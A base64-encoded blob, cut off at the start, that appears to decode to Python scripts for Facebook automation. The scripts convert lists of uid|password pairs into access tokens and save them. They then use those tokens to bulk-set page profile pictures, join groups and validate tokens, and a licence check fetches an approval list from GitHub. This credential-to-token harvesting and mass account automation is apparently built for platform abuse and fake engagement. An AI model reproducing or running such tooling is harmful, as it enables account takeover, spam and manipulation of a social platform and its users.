9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwgZGF0YT1kYXRhKQogICAgICAgICAgICByZXNwb25zZS5yYWlzZV9mb3Jfc3RhdHVzKCkKICAgICAgICAgICAgcmVzcG9uc2VzID0gcmVzcG9uc2UuanNvbigpCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiByZXNwb25zZXM6CiAgICAgICAgICAgICAgICByZXR1cm4gcmVzcG9uc2VzWydhY2Nlc3NfdG9rZW4nXSwgVHJ1ZQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgZXJyb3JfbXNnID0gcmVzcG9uc2VzLmdldCgnZXJyb3JfbXNnJywgJ1Vua25vd24gZXJyb3InKQogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Q29sb3IuUkVEfUVycm9yIGZvciB7dXNlcm5hbWV9OiB7ZXJyb3JfbXNnfXtDb2xvci5FTkR9IikKICAgICAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5SZXF1ZXN0RXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHByaW50KGYie0NvbG9yLlJFRH1FcnJvciBmb3Ige3VzZXJuYW1lfToge3N0cihlKX17Q29sb3IuRU5EfSIpCiAgICAKICAgIHJldHVybiBOb25lLCBGYWxzZQoKZGVmIHNhdih0b2tlbnNfYXJyYXksIHRva2VuX2ZpbGVfcGF0aCk6CiAgICAiIiJTYXZlIHRva2VucyBpbiB1aWR8dG9rZW4gZm9ybWF0LiIiIgogICAgd2l0aCBvcGVuKHRva2VuX2ZpbGVfcGF0aCwgJ3cnKSBhcyBmaWxlOgogICAgICAgIGZvciB0b2tlbl9pbmZvIGluIHRva2Vuc19hcnJheToKICAgICAgICAgICAgdWlkID0gdG9rZW5faW5mb1snZW1haWwnXQogICAgICAgICAgICBhY2Nlc3NfdG9rZW4gPSB0b2tlbl9pbmZvWydhY2Nlc3NfdG9rZW4nXQogICAgICAgICAgICBmaWxlLndyaXRlKGYie3VpZH18e2FjY2Vzc190b2tlbn1cbiIpCgpkZWYgcHJ6KGZpbGVfcGF0aCwgdG9rZW5zX2FycmF5KToKICAgICIiIlByb2Nlc3MgdGhlIGZpbGUgYW5kIGV4dHJhY3QgdG9rZW5zIGZvciB1aWR8cGFzcyBmb3JtYXQuIiIiCiAgICBpZiBub3Qgb3MucGF0aC5pc2ZpbGUoZmlsZV9wYXRoKToKICAgICAgICBwcmludChmIntDb2xvci5CT0xEfUZpbGUge2ZpbGVfcGF0aH0gZG9lcyBub3QgZXhpc3Que0NvbG9yLkVORH0iKQogICAgICAgIHJldHVybgoKICAgIHByaW50KGYiICAgICB7Q29sb3IuQk9MRH1Qcm9jZXNzaW5nIGZpbGU6IHtmaWxlX3BhdGh9e0NvbG9yLkVORH0iKQoKICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdyJykgYXMgZmlsZToKICAgICAgICBsaW5lcyA9IGZpbGUucmVhZGxpbmVzKCkKCiAgICBpZiBub3QgbGluZXM6CiAgICAgICAgcHJpbnQoZiJ7Q29sb3IuQk9MRH1GaWxlIHtmaWxlX3BhdGh9IGlzIGVtcHR5LntDb2xvci5FTkR9IikKICAgICAgICByZXR1cm4KCiAgICBhY2NvdW50X3BhaXJzID0gW2xpbmUuc3RyaXAoKSBmb3IgbGluZSBpbiBsaW5lcyBpZiAnfCcgaW4gbGluZV0KCiAgICBpZiBub3QgYWNjb3VudF9wYWlyczoKICAgICAgICBwcmludChmIntDb2xvci5CT0xEfU5vIHZhbGlkIHVpZHxwYXNzIHBhaXJzIGZvdW5kIGluIHtmaWxlX3BhdGh9LntDb2xvci5FTkR9IikKICAgICAgICByZXR1cm4KCiAgICBmb3IgYWNjb3VudCBpbiBhY2NvdW50X3BhaXJzOgogICAgICAgIHVpZCwgcGFzc3dvcmQgPSBhY2NvdW50LnNwbGl0KCd8JykKICAgICAgICBwYXNzCiAgICAgICAgdG9rZW4sIHN1Y2Nlc3MgPSBwemwodWlkLCBbcGFzc3dvcmRdKSAgIyBVc2luZyB0aGUgcGFzc3dvcmQgYXMgYSBzaW5nbGUgZWxlbWVudCBsaXN0CiAgICAgICAgaWYgc3VjY2VzczoKICAgICAgICAgICAgdG9rZW5zX2FycmF5LmFwcGVuZCh7ImVtYWlsIjogdWlkLCAiYWNjZXNzX3Rva2VuIjogdG9rZW59KQogICAgICAgICAgICBwcmludChmIntDb2xvci5HUkVFTn1TdWNjZXNzZnVsbHkgZXh0cmFjdGVkIHRva2VuIGZvciB7dWlkfXtDb2xvci5FTkR9IikKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludChmIntDb2xvci5CT0xEfUZhaWxlZCB0byBnZXQgdG9rZW4gZm9yIHt1aWR9LntDb2xvci5FTkR9IikKCmRlZiBtYXooKToKICAgIGNsZWFyX3NjcmVlbigpCiAgICBqb3ZhbigpCiAgICBmaWxlX3BhdGggPSBpbnB1dChmIntDb2xvci5ZRUxMT1d9RW50ZXIgdGhlIHBhdGggb2YgdGhlIHRleHQgZmlsZSB3aXRoIGFjY291bnRzIGFuZCBwYXNzd29yZHM6IHtDb2xvci5FTkR9Iikuc3RyaXAoKQogICAgdG9rZW5fZmlsZV9wYXRoID0gaW5wdXQoZiJ7Q29sb3IuWUVMTE9XfUVudGVyIHRoZSBwYXRoIG9mIHRoZSBmaWxlIHdoZXJlIHRva2VucyBzaG91bGQgYmUgc3RvcmVkOiB7Q29sb3IuRU5EfSIpLnN0cmlwKCkKICAgIAogICAgdG9rZW5zX2FycmF5ID0gW10KICAgIHByeihmaWxlX3BhdGgsIHRva2Vuc19hcnJheSkKCiAgICBpZiB0b2tlbnNfYXJyYXk6CiAgICAgICAgcGFzcwogICAgICAgIGZvciB0b2tlbl9pbmZvIGluIHRva2Vuc19hcnJheToKICAgICAgICAgICAgcGFzcwogICAgICAgIAogICAgICAgIHNhdih0b2tlbnNfYXJyYXksIHRva2VuX2ZpbGVfcGF0aCkgICMgU2F2ZSB0b2tlbnMgaW4gdWlkfHRva2VuIGZvcm1hdAogICAgZWxzZToKICAgICAgICBwcmludChmIntDb2xvci5CT0xEfU5vIHRva2VucyBjb2xsZWN0ZWQue0NvbG9yLkVORH0iKQoKICAgIHByaW50KGYie0NvbG9yLkJMVUV9RXhpdGluZyB0aGUgcHJvZ3JhbS4uLntDb2xvci5FTkR9IikKCiMgUnVuIHRoZSBwcm9ncmFtCgoKCgoKCiMgU3RhcnQgdGhlIHByb2dyYW0KCgoKZGVmIHN0YXJ0KCk6CiAgICBjbGVhcl9zY3JlZW4oKQogICAgam92YW4oKQogICAgdG9rZW5fZmlsZV9wYXRoID0gaW5wdXQoIkVudGVyIHRoZSBwYXRoIHRvIHRoZSBmaWxlIGNvbnRhaW5pbmcgdGhlIHRva2VuczogIikuc3RyaXAoKQogICAgCiAgICB0b2tlbnMgPSByYWQodG9rZW5fZmlsZV9wYXRoKQogICAgaWYgbm90IHRva2VuczoKICAgICAgICBwcmludCgiTm8gdG9rZW5zIGZvdW5kLiBFeGl0aW5nLiIpCiAgICAgICAgcmV0dXJuCgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKERJUkVDVE9SWSk6CiAgICAgICAgcHJpbnQoZiJFcnJvcjogRGlyZWN0b3J5ICd7RElSRUNUT1JZfScgZG9lcyBub3QgZXhpc3QuIikKICAgICAgICByZXR1cm4KCiAgICBmaWxlc19pbl9kaXJlY3RvcnkgPSBvcy5saXN0ZGlyKERJUkVDVE9SWSkKICAgIGlmIG5vdCBmaWxlc19pbl9kaXJlY3Rvcnk6CiAgICAgICAgcHJpbnQoZiJFcnJvcjogTm8gZmlsZXMgZm91bmQgaW4gZGlyZWN0b3J5ICd7RElSRUNUT1JZfScuIikKICAgICAgICByZXR1cm4KCiAgICBmb3IgdXNlcl90b2tlbiBpbiB0b2tlbnM6CiAgICAgICAgcGFnZXMgPSBwaWd6cyh1c2VyX3Rva2VuKQogICAgICAgIGlmIG5vdCBwYWdlczoKICAgICAgICAgICAgcHJpbnQoZiJObyBwYWdlcyBmb3VuZCBmb3IgdG9rZW4ge3VzZXJfdG9rZW59LiBTa2lwcGluZy4iKQogICAgICAgICAgICBjb250aW51ZQoKICAgICAgICBmb3IgcGFnZSBpbiBwYWdlczoKICAgICAgICAgICAgcGFzcwogICAgICAgICAgICBwYWdlX2lkID0gcGFnZVsnaWQnXQogICAgICAgICAgICBwYWdlX2FjY2Vzc190b2tlbiA9IHBhZ2UuZ2V0KCdhY2Nlc3NfdG9rZW4nKQoKICAgICAgICAgICAgaWYgbm90IHBhZ2VfYWNjZXNzX3Rva2VuOgogICAgICAgICAgICAgICAgcHJpbnQoZiJObyBhY2Nlc3MgdG9rZW4gZm91bmQgZm9yIHBhZ2Uge3BhZ2VfaWR9LiBTa2lwcGluZy4iKQogICAgICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgICAgICMgQ2hlY2sgaWYgdGhlIHBhZ2UgYWxyZWFkeSBoYXMgYSBwcm9maWxlIHBpY3R1cmUKICAgICAgICAgICAgaWYgcGVjKHBhZ2VfaWQpOgogICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgICAgICMgUmFuZG9tbHkgc2VsZWN0IGEgZmlsZSBmcm9tIHRoZSBkaXJlY3RvcnkKICAgICAgICAgICAgZmlsZV9uYW1lID0gcmFuZG9tLmNob2ljZShmaWxlc19pbl9kaXJlY3RvcnkpCiAgICAgICAgICAgIGZpbGVfcGF0aCA9IG9zLnBhdGguam9pbihESVJFQ1RPUlksIGZpbGVfbmFtZSkKCiAgICAgICAgICAgIHJlc3VsdCA9IHBsb2QocGFnZV9pZCwgcGFnZV9hY2Nlc3NfdG9rZW4sIGZpbGVfcGF0aCkKICAgICAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgICAgIHByaW50KGYiICAgIHtncmVlbn1TVUNDRVNTRlVMTFkgVVBMT0FERUQgUFJPRklMRSBQSUNUVVJFIHtwYWdlWyduYW1lJ119IOKUgOKUgOKUgOKUgOKUgOKUgD4ge3BhZ2VbJ2lkJ119ICIpCiAgICAgICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgICAgICAjIEFkZCBhIGRlbGF5IGJldHdlZW4gcmVxdWVzdHMgdG8gYXZvaWQgaGl0dGluZyByYXRlIGxpbWl0cwogICAgICAgICAgICB0aW1lLnNsZWVwKDIpICAjIEFkanVzdCBkZWxheSBhcyBuZWVkZWQKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCBvcwppbXBvcnQgcmFuZG9tCmltcG9ydCB0aW1lCgpCQVNFX1VSTCA9ICdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTguMCcKRElSRUNUT1JZID0gJ1BpY3R1cmUnCgpkZWYgcGlnenMoYWNjZXNzX3Rva2VuKToKICAgIHVybCA9IGYne0JBU0VfVVJMfS9tZS9hY2NvdW50cycKICAgIHBhcmFtcyA9IHsKICAgICAgICAnYWNjZXNzX3Rva2VuJzogYWNjZXNzX3Rva2VuCiAgICB9CiAgICB0cnk6CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsLCBwYXJhbXM9cGFyYW1zKQogICAgICAgIHJlc3BvbnNlLnJhaXNlX2Zvcl9zdGF0dXMoKQogICAgICAgIHJldHVybiByZXNwb25zZS5qc29uKCkuZ2V0KCdkYXRhJywgW10pCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5SZXF1ZXN0RXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJFcnJvciBnZXR0aW5nIHBhZ2VzIGZvciB0b2tlbiB7YWNjZXNzX3Rva2VufToge3N0cihlKX0iKQogICAgICAgIHJldHVybiBbXQoKZGVmIHBlYyhwYWdlX2lkKToKICAgIHVybCA9IGYne0JBU0VfVVJMfS97cGFnZV9pZH0/ZmllbGRzPXBpY3R1cmUnCiAgICB0cnk6CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsKQogICAgICAgIHJlc3BvbnNlLnJhaXNlX2Zvcl9zdGF0dXMoKQogICAgICAgIHBpY3R1cmVfZGF0YSA9IHJlc3BvbnNlLmpzb24oKS5nZXQoJ3BpY3R1cmUnLCB7fSkKICAgICAgICByZXR1cm4gJ2RhdGEnIGluIHBpY3R1cmVfZGF0YSBhbmQgJ3VybCcgaW4gcGljdHVyZV9kYXRhWydkYXRhJ10KICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLlJlcXVlc3RFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIkVycm9yIGNoZWNraW5nIHByb2ZpbGUgcGljdHVyZSBmb3IgcGFnZSB7cGFnZV9pZH06IHtzdHIoZSl9IikKICAgICAgICByZXR1cm4gRmFsc2UKCmRlZiBwbG9kKHBhZ2VfaWQsIHBhZ2VfYWNjZXNzX3Rva2VuLCBmaWxlX3BhdGgpOgogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdyYicpIGFzIGZpbGU6CiAgICAgICAgICAgIGZpbGVzID0gewogICAgICAgICAgICAgICAgJ3NvdXJjZSc6IGZpbGUKICAgICAgICAgICAgfQogICAgICAgICAgICBkYXRhID0gewogICAgICAgICAgICAgICAgJ2FjY2Vzc190b2tlbic6IHBhZ2VfYWNjZXNzX3Rva2VuCiAgICAgICAgICAgIH0KICAgICAgICAgICAgdXJsID0gZid7QkFTRV9VUkx9L3twYWdlX2lkfS9waWN0dXJlJwogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBmaWxlcz1maWxlcywgZGF0YT1kYXRhKQogICAgICAgICAgICByZXNwb25zZS5yYWlzZV9mb3Jfc3RhdHVzKCkKICAgICAgICAgICAgcmV0dXJuIHJlc3BvbnNlLmpzb24oKQogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuUmVxdWVzdEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiRXJyb3IgdXBsb2FkaW5nIHByb2ZpbGUgcGljdHVyZSB0byBwYWdlIHtwYWdlX2lkfToge3N0cihlKX0iKQogICAgICAgIHJldHVybiB7J2Vycm9yJzogc3RyKGUpfQogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yIGFzIGU6CiAgICAgICAgcHJpbnQoZiJFcnJvcjogRmlsZSBub3QgZm91bmQge2ZpbGVfcGF0aH06IHtzdHIoZSl9IikKICAgICAgICByZXR1cm4geydlcnJvcic6IHN0cihlKX0KCmRlZiByYWQoZmlsZV9wYXRoKToKICAgIHRva2VucyA9IFtdCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3InKSBhcyBmaWxlOgogICAgICAgICAgICBsaW5lcyA9IGZpbGUucmVhZGxpbmVzKCkKICAgICAgICAgICAgZm9yIGxpbmUgaW4gbGluZXM6CiAgICAgICAgICAgICAgICAjIFN0cmlwIGFueSB3aGl0ZXNwYWNlIGFuZCBjaGVjayBpZiB0aGUgbGluZSBjb250YWlucyB0aGUgZXhwZWN0ZWQgZm9ybWF0CiAgICAgICAgICAgICAgICBsaW5lID0gbGluZS5zdHJpcCgpCiAgICAgICAgICAgICAgICBpZiAnfCcgaW4gbGluZToKICAgICAgICAgICAgICAgICAgICB1aWQsIHRva2VuID0gbGluZS5zcGxpdCgnfCcsIDEpICAjIFNwbGl0IG9uIHRoZSBmaXJzdCAnfCcKICAgICAgICAgICAgICAgICAgICB0b2tlbnMuYXBwZW5kKCh1aWQuc3RyaXAoKSwgdG9rZW4uc3RyaXAoKSkpICAjIEFwcGVuZCBhcyBhIHR1cGxlCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3IgYXMgZToKICAgICAgICBwcmludChmIkVycm9yOiBUb2tlbnMgZmlsZSBub3QgZm91bmQge2ZpbGVfcGF0aH06IHtzdHIoZSl9IikKICAgIHJldHVybiB0b2tlbnMKCmRlZiBtYWluenNhKCk6CiAgICBjbGVhcl9zY3JlZW4oKQogICAgam92YW4oKQogICAgcHJpbnQoZiIgICAgIHtyZWR9WzFdIHtncmVlbn1HRVQgVE9LRU4iKQogICAgcHJpbnQoKQogICAgcHJpbnQoZiIgICAgIHtyZWR9WzJdIHtncmVlbn1TRVQgUEZQIikKICAgIHByaW50KCJcMDMzWzE7MzFt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzMyIpCiAgICBjaG9pY2UgPSBpbnB1dCgiRW50ZXI6ICIpCiAgICBpZiBjaG9pY2UgPT0gJzEnOgogICAgICAgIG1heigpCiAgICBpZiBjaG9pY2UgPT0gJzInOgogICAgICAgIHN0YXJ0KCkKICAgIGVsc2U6IAogICAgICAgIHByaW50KCJpbnZhbGlkIHBvIikKICAgICAgICBjbGVhcl9zY3JlZW4oKQoKCgogICAgICAgICAgIAoKCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgcmFuZG9tCmltcG9ydCBzdHJpbmcKaW1wb3J0IG9zCgpDT0RFX0ZJTEUgPSAnL3NkY2FyZC9ib29zdHBoZXJlL2dlbmVyYXRlZF9jb2RlLnR4dCcgICMgRmlsZSB0byBzdG9yZSB0aGUgZ2VuZXJhdGVkIGNvZGUKCmRlZiBlbnN1cmVfZmlsZV9leGlzdHMoKToKICAgICIiIkVuc3VyZSB0aGF0IHRoZSBjb2RlIGZpbGUgZXhpc3RzIGJ5IGNyZWF0aW5nIGl0IGlmIGl0IGRvZXNuJ3QgZXhpc3QuIiIiCiAgICBvcGVuKENPREVfRklMRSwgJ2EnKS53cml0ZSgnJykgICMgVGhpcyB3aWxsIGNyZWF0ZSB0aGUgZmlsZSBpZiBpdCBkb2Vzbid0IGV4aXN0LCBidXQgd29uJ3QgbW9kaWZ5IGl0LgoKZGVmIGdlbmVyYXRlX2NvZGUoKToKICAgICIiIkdlbmVyYXRlIGEgdW5pcXVlIGNvZGUgaW4gdGhlIGZvcm1hdCBCT09TVFBIRVJFLVhYWC1YWFhYWC4iIiIKICAgIHByZWZpeCA9ICJCT09TVFBIRVJFIgogICAgbnVtYmVyX3BhcnQgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2VzKHN0cmluZy5kaWdpdHMsIGs9MykpICAjIDMgcmFuZG9tIGRpZ2l0cwogICAgbGV0dGVyc19wYXJ0ID0gJycuam9pbihyYW5kb20uY2hvaWNlcyhzdHJpbmcuYXNjaWlfdXBwZXJjYXNlICsgc3RyaW5nLmRpZ2l0cywgaz01KSkgICMgNSBhbHBoYW51bWVyaWMgY2hhcmFjdGVycwogICAgY29kZSA9IGYie3ByZWZpeH0te251bWJlcl9wYXJ0fS17bGV0dGVyc19wYXJ0fSIKICAgIHJldHVybiBjb2RlCgpkZWYgc2F2ZV9jb2RlKGNvZGUpOgogICAgIiIiU2F2ZSB0aGUgZ2VuZXJhdGVkIGNvZGUgdG8gYSBmaWxlLiIiIgogICAgd2l0aCBvcGVuKENPREVfRklMRSwgJ3cnKSBhcyBmaWxlOgogICAgICAgIGZpbGUud3JpdGUoY29kZSkKCmRlZiBsb2FkX2NvZGUoKToKICAgICIiIkxvYWQgdGhlIGNvZGUgZnJvbSB0aGUgZmlsZSwgaWYgaXQgZXhpc3RzLiIiIgogICAgaWYgb3MucGF0aC5leGlzdHMoQ09ERV9GSUxFKToKICAgICAgICB3aXRoIG9wZW4oQ09ERV9GSUxFLCAncicpIGFzIGZpbGU6CiAgICAgICAgICAgIHJldHVybiBmaWxlLnJlYWQoKS5zdHJpcCgpCiAgICByZXR1cm4gTm9uZQoKZGVmIGlzX2NvZGVfYXBwcm92ZWQoY29kZSk6CiAgICAiIiJDaGVjayBpZiB0aGUgZ2VuZXJhdGVkIGNvZGUgaXMgYXBwcm92ZWQgYnkgZmV0Y2hpbmcgdGhlIGFwcHJvdmFsIGxpc3QuIiIiCiAgICB0cnk6CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS90ZXN0ZXJ6NTU5L0JPT1NUSU5HQVBQUk9WQUwvcmVmcy9oZWFkcy9tYWluL0FwcHJvdmFsIikKICAgICAgICByZXNwb25zZS5yYWlzZV9mb3Jfc3RhdHVzKCkgICMgUmFpc2UgYW4gZXJyb3IgZm9yIGJhZCByZXNwb25zZXMKICAgICAgICBhcHByb3ZlZF9jb2RlcyA9IHJlc3BvbnNlLnRleHQuc3BsaXRsaW5lcygpICAjIFNwbGl0IHRoZSByZXNwb25zZSBpbnRvIGxpbmVzCiAgICAgICAgCiAgICAgICAgIyBSZW1vdmUgY29tbWVudHMgYW5kIHN0cmlwIHdoaXRlc3BhY2UsIHRoZW4gY2hlY2sgZm9yIHRoZSBjb2RlCiAgICAgICAgYXBwcm92ZWRfY29kZXMgPSBbbGluZS5zcGxpdCgnIycpWzBdLnN0cmlwKCkgZm9yIGxpbmUgaW4gYXBwcm92ZWRfY29kZXMgaWYgbGluZV0KICAgICAgICByZXR1cm4gY29kZSBpbiBhcHByb3ZlZF9jb2RlcyAgIyBDaGVjayBpZiB0aGUgY29kZSBpcyBpbiB0aGUgYXBwcm92ZWQgbGlzdAogICAgZXhjZXB0IHJlcXVlc3RzLlJlcXVlc3RFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIkVycm9yIGZldGNoaW5nIHRoZSBhcHByb3ZhbCBsaXN0OiB7ZX0iKQogICAgICAgIHJldHVybiBGYWxzZQoKCmRlZiBnZW5lcmF0ZV9hbmRfY2hlY2tfY29kZSgpOgogICAgIiIiR2VuZXJhdGUgYSBjb2RlIGlmIG5vdCBleGlzdGluZywgY2hlY2sgaWYgaXQncyBhcHByb3ZlZCwgdGhlbiBydW4gbWFpbigpLiIiIgogICAgZW5zdXJlX2ZpbGVfZXhpc3RzKCkgICMgRW5zdXJlIHRoZSBjb2RlIGZpbGUgZXhpc3RzIGJlZm9yZSBwcm9jZWVkaW5nCiAgICAKICAgIGNvZGUgPSBsb2FkX2NvZGUoKQogICAgCiAgICBpZiBjb2RlIGlzIE5vbmUgb3IgY29kZSA9PSAnJzoKICAgICAgICBjb2RlID0gZ2VuZXJhdGVfY29kZSgpCiAgICAgICAgc2F2ZV9jb2RlKGNvZGUpCiAgICAgICAgY2xlYXJfc2NyZWVuKCkKICAgICAgICBqb3ZhbigpCiAgICAgICAgCiAgICAgICAgcHJpbnQoZiIgICAgICB7eWVsbG93fVlPVVIgR0VORVJBVEVEIENPREUge3doaXRlfToge3JlZH17Y29kZX0iKQogICAgZWxzZToKICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgIGpvdmFuKCkKICAgICAgICAKICAgICAgICBwcmludChmIiAgICAge3llbGxvd31ZT1VSIENPREUge3doaXRlfToge3JlZH17Y29kZX0iKQoKICAgIGlmIGlzX2NvZGVfYXBwcm92ZWQoY29kZSk6CiAgICAgICAgbWFpbigpCiAgICBlbHNlOgogICAgICAgIHByaW50KGYiICAgICB7cmVkfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIHByaW50KGYiICAgICB7cmVkfUNPREUgSVMgTk9UIEFQUFJPVkVEICEge3llbGxvd31QTEVBU0UgU0VORCBJVCBUTyB7d2hpdGV9OiB7eWVsbG93fWh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9wcm9maWxlLnBocD9pZD0xMDAwNzgwNDMyMjIyNjAiKQoKaW1wb3J0IHJlcXVlc3RzCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IsIGFzX2NvbXBsZXRlZAoKZGVmIGdldF9wcm9maWxlX2lkKGFjY2Vzc190b2tlbik6CiAgICAiIiJSZXRyaWV2ZSB0aGUgcHJvZmlsZSBJRCB1c2luZyB0aGUgcHJvdmlkZWQgYWNjZXNzIHRva2VuLiIiIgogICAgdHJ5OgogICAgICAgIHVybCA9ICdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZScKICAgICAgICBwYXJhbXMgPSB7J2FjY2Vzc190b2tlbic6IGFjY2Vzc190b2tlbn0KICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwsIHBhcmFtcz1wYXJhbXMpCiAgICAgICAgCiAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICByZXR1cm4gcmVzcG9uc2UuanNvbigpLmdldCgnaWQnKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHJldHVybiBOb25lCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5SZXF1ZXN0RXhjZXB0aW9uOgogICAgICAgIHJldHVybiBOb25lCgppbXBvcnQgcmVxdWVzdHMKZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvciwgYXNfY29tcGxldGVkCgpkZWYgam9pbl9ncm91cChncm91cF9pZCwgcHJvZmlsZV9pZCwgYWNjZXNzX3Rva2VuKToKICAgICIiIkF0dGVtcHQgdG8gam9pbiBhIGdyb3VwIHVzaW5nIHRoZSBwcm92aWRlZCBhY2Nlc3MgdG9rZW4uIiIiCiAgICB0cnk6CiAgICAgICAgIyBDb25zdHJ1Y3QgdGhlIFVSTCBieSBpbmNsdWRpbmcgdGhlIHByb2ZpbGUgSUQgaW4gdGhlIHBhdGgKICAgICAgICB1cmwgPSBmJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3tncm91cF9pZH0vbWVtYmVycy97cHJvZmlsZV9pZH0nCiAgICAgICAgcGFyYW1zID0geydhY2Nlc3NfdG9rZW4nOiBhY2Nlc3NfdG9rZW59CiAgICAgICAgCiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwgcGFyYW1zPXBhcmFtcykKICAgICAgICAKICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgIHJldHVybiBUcnVlCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmV0dXJuIEZhbHNlCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5SZXF1ZXN0RXhjZXB0aW9uOgogICAgICAgIHJldHVybiBGYWxzZQppbXBvcnQgcmVxdWVzdHMKI2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL2RlYnVnX3Rva2VuP2lucHV0X3Rva2VuPXt0b2tlbn0mYWNjZXNzX3Rva2VuPXt0b2tlbn0KZGVmIHZhbCh0b2tlbik6CiAgICAjIENyZWF0ZSB0aGUgdmFsaWRhdGlvbiBVUkwKICAgIHZhbGlkYXRpb25fdXJsID0gZiJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9kZWJ1Z190b2tlbj9pbnB1dF90b2tlbj17dG9rZW59JmFjY2Vzc190b2tlbj17dG9rZW59IgoKICAgICMgU2VuZCB0aGUgcmVxdWVzdCB0byB0aGUgRmFjZWJvb2sgR3JhcGggQVBJCiAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCh2YWxpZGF0aW9uX3VybCkKCiAgICAjIFJldHVybiB0aGUgcmVzcG9uc2UgYXMgSlNPTiBpZiB2YWxpZCwgb3RoZXJ3aXNlIHJldHVybiBOb25lCiAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgcmV0dXJuIHJlc3BvbnNlLmpzb24oKQogICAgZWxzZToKICAgICAgICByZXR1cm4gTm9uZQppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IGJhc2U2NA